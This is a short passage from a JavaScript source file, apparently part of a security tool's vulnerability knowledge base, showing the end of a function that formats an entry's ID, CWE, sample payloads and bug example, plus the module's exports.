  return {
    vuln_id: e.vulnId,
    cwe: e.cwe,
    payload_example: (e.payloads || []).slice(0, 4),
    bug_example: e.vulnerable
      ? { vulnerable: e.vulnerable, attack: e.attack, response: e.response }
      : null,
  };
}

module.exports = { kbFor, kbEntry, kbSearch, kbList, ENRICH, KB };
